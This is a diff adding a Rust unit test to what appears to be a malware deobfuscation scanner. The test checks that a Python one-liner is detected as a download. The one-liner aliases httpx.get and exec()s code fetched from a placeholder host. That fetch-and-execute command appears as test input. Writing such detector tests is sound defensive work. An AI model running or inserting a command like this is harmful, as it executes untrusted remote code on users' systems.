@@ -15230,6 +15230,38 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn python_httpx_assigned_get_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; fetch = httpx.get; exec(fetch('https://py.example/httpx-assigned-alias').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-assigned-alias" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python httpx assigned get alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-assigned-alias")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python httpx assigned get alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_get_adjacent_string_literals_emit_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
